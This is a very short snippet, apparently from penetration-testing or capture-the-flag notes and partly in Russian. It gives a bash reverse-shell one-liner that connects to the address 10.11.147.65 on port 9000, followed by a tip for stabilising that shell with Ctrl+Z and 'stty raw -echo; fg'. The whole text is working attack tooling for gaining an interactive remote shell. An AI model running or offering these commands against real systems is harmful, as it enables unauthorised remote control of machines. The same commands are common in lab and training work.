with bash
```shell
bash -c "bash -i >& /dev/tcp/10.11.147.65/9000 0>&1"
```
---
хороша стабилизация после установки реверсшела: 
```shell
# Нажми CTRL+Z, чтобы приостановить shell
stty raw -echo; fg
# нажми Enter
```
